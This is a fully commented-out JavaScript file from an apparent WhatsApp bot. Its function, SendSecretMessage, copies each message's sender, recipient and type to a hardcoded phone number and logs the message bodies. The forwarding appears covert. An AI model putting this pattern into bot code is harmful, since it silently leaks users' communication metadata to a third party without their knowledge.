// import {
//     changeWhatsAppNumberWithNormalNumber,
//     changeNormalNumberWithWhatsAppNumber
// } from "../Contacts/changeWhatsAppNumberWithNormalNumber.js";
// import {
//     Lion
// } from "../../index.js";

// export const SendSecretMessage = (Message) => {
//             let msg = `The ${changeWhatsAppNumberWithNormalNumber(Message.from)} and 
//                 ${changeWhatsAppNumberWithNormalNumber(Message.to)}
//                 and ${Message.type} is this.
//                 `,
//                 x=changeWhatsAppNumberWithNormalNumber(Message.to);
//         let num = changeNormalNumberWithWhatsAppNumber("971589969886");


//     try {

//         console.log(`the SendSecretMessage has type of ----------------------------${Message.body}`);
//         console.log(`the SendSecretMessage has type of ----**********-------------${msg}`);

//         console.log(x);

//         if(Message.to !== num){
//         Lion.sendMessage(num, msg);
//         }
//     } catch (error) {
//         console.log(error);
//     }
// }